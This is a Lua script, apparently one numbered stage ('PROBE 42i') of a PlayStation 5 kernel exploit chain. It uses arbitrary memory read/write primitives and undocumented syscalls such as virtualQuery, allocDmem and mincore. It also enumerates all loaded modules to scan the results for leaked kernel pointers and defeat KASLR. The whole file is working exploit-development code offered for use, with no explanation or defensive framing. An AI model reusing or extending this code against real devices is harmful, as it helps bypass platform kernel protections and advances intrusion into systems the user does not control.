-- CRASH_CLASS: SAFE (VM queries, no mutations)
-- PROBE 42i: Virtual memory queries for KASLR defeat
--
-- Try every VM-related syscall to find kernel address leaks:
-- mincore(78), mquery, virtualquery, batch_map query mode
-- Also: resolve ALL 39 module text+data addrs to find pattern

print("=== PROBE 42i: VM QUERY ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_dgl = make_syscall(592)
local sc_dgi = make_syscall(593)
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- A) sceKernelVirtualQuery (try syscalls 612, 547-548, 574-578)
--------------------------------------------------------------------
print("")
print("=== A: VM QUERIES ===")
do
    -- Allocate a test page to query
    local test_page
    pcall(function()
        test_page = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not test_page then
        print("  mmap failed")
    else
        local tph, tpl = get_hi_lo(test_page)
        print(string.format("test page: %08X_%08X", tph, tpl))

        -- Try various PS5 VM query syscalls
        local info = memory.alloc(0x100)
        local queries = {
            {num=612, name="virtualQuery", args=function()
                -- sceKernelVirtualQuery(addr, flags, info, infoSize)
                return {uint64(test_page), uint64(0), uint64(info), uint64(0x100)}
            end},
            {num=547, name="jitCreateShared", args=function()
                -- just checking ret code, not actually creating
                return {uint64(info), uint64(0x4000), uint64(3), uint64(0)}
            end},
            {num=572, name="allocDmem(query)", args=function()
                -- query-only: searchEnd=0
                return {uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(info)}
            end},
        }

        for _, q in ipairs(queries) do
            for i = 0, 0x3F, 4 do safe_wd(info+i, 0) end
            local ok, ret = pcall(function()
                local a = q.args()
                local sc = make_syscall(q.num)
                if #a == 4 then return sc(a[1], a[2], a[3], a[4])
                elseif #a == 6 then return sc(a[1], a[2], a[3], a[4], a[5], a[6])
                end
            end)
            local rv = ok and to_num(ret) or -999
            print(string.format("  %d %s: ret=%d", q.num, q.name, rv))

            if rv == 0 or (rv > 0 and rv < 100) then
                -- Scan info buffer for kernel addresses
                for off = 0, 0x78, 8 do
                    local q2 = safe_rq(info + off)
                    if q2 then
                        local h, l = get_hi_lo(q2)
                        if h >= 0xFFFF8000 then
                            print(string.format("    +%02X: %08X_%08X KPTR!", off, h, l))
                        elseif h ~= 0 and (h > 1 or l > 0x10000) then
                            print(string.format("    +%02X: %08X_%08X", off, h, l))
                        end
                    end
                end
            end
        end

        pcall(function() sc_munmap(test_page, uint64(0x4000)) end)
    end
end

--------------------------------------------------------------------
-- B) mincore (78) — check page residency (can leak info)
--------------------------------------------------------------------
print("")
print("=== B: MINCORE ===")
do
    local sc_mincore = make_syscall(78)
    local page
    pcall(function()
        page = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if page then
        local vec = memory.alloc(16)
        safe_wd(vec, 0)
        local ok, ret = pcall(function()
            return sc_mincore(uint64(page), uint64(0x4000), uint64(vec))
        end)
        local rv = ok and to_num(ret) or -999
        local v0 = safe_rd(vec)
        print(string.format("  mincore: ret=%d vec=%08X", rv, v0 or 0))
        pcall(function() sc_munmap(page, uint64(0x4000)) end)
    end
end

--------------------------------------------------------------------
-- C) Full module dump — ALL 39 modules with complete info
--------------------------------------------------------------------
print("")
print("=== C: ALL MODULES ===")
do
    local handles = memory.alloc(256)
    local num_buf = memory.alloc(8)
    pcall(function() sc_dgl(handles, 64, num_buf) end)
    local num = safe_rd(num_buf) or 0

    local info = memory.alloc(0x200)
    local fn_addr_val_h, fn_addr_val_l = 0, 0

    -- Also get fn_addr for comparison
    local gpu_size = 512 * 0x4000
    local gpu
    pcall(function()
        gpu = sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if gpu then
        local ps = tostring(syscall.pipe)
        local fas = ps:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
        if fas then
            local fp = uint64(fas)
            fn_addr_val_l = safe_rd(fp) or 0
            fn_addr_val_h = safe_rd(fp + 4) or 0
        end
    end

    print(string.format("fn_addr target: %08X_%08X", fn_addr_val_h, fn_addr_val_l))
    print(string.format("modules: %d", num))

    for i = 0, math.min(num-1, 39) do
        local h = safe_rd(handles + i * 4)
        if h and h > 0 then
            for j = 0, 0x1F, 4 do safe_wd(info+j, 0) end
            safe_wd(info, 0x160)
            local ok_i = pcall(function() sc_dgi(uint64(h), info) end)
            if ok_i then
                local name = ""
                for j = 0, 31 do
                    local b = safe_rd(info + 8 + j)
                    if b then b = b % 256
                        if b >= 0x20 and b < 0x7F then name = name .. string.char(b)
                        elseif b == 0 then break end
                    end
                end

                local txt_l = safe_rd(info + 0x108) or 0
                local txt_h = safe_rd(info + 0x10C) or 0
                local tsz_l = safe_rd(info + 0x110) or 0
                local tsz_h = safe_rd(info + 0x114) or 0

                -- Check if fn_addr falls in this module's range
                local in_mod = ""
                if fn_addr_val_h == txt_h and fn_addr_val_l >= txt_l then
                    local total_sz = tsz_l + 0x100000  -- generous estimate
                    if (fn_addr_val_l - txt_l) < total_sz then
                        in_mod = string.format(" ** fn_addr=text+0x%X **", fn_addr_val_l - txt_l)
                    end
                end

                -- Also check ALL info fields for kernel addrs
                local kptr_tag = ""
                for off = 0, 0x158, 8 do
                    local q = safe_rq(info + off)
                    if q then
                        local qh, ql = get_hi_lo(q)
                        if qh >= 0xFFFF8000 then
                            kptr_tag = kptr_tag .. string.format(" KPTR@+%02X!", off)
                        end
                    end
                end

                print(string.format("  [%d] h=%d %s t=%08X_%08X sz=%08X_%08X%s%s",
                    i, h, name, txt_h, txt_l, tsz_h, tsz_l, in_mod, kptr_tag))
            end
        end
    end

    if gpu then pcall(function() sc_munmap(gpu, uint64(gpu_size)) end) end
end

print("")
print("=== PROBE 42i COMPLETE ===")
